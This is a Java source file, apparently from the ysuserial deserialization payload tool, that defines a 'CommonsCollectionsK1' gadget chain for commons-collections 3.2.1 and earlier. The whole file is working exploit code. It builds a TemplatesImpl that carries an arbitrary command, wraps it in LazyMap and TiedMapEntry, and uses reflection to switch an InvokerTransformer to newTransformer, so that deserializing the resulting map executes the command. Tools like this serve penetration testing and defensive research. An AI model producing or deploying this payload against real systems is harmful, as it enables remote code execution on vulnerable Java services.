package org.su18.ysuserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.Reflections;

import java.util.HashMap;
import java.util.Map;

/**
 * @author su18
 */
@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
@Authors({"KORLR"})
public class CommonsCollectionsK1 implements ObjectPayload {

	public Map getObject(String command) throws Exception {
		Object                  templates   = Gadgets.createTemplatesImpl(command);
		InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
		HashMap<String, String> innerMap    = new HashMap<String, String>();
		Map                     m           = LazyMap.decorate(innerMap, (Transformer) transformer);
		Map<Object, Object>     outerMap    = new HashMap<Object, Object>();
		TiedMapEntry            tied        = new TiedMapEntry(m, templates);
		outerMap.put(tied, "t");
		innerMap.clear();
		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
		return outerMap;
	}
}
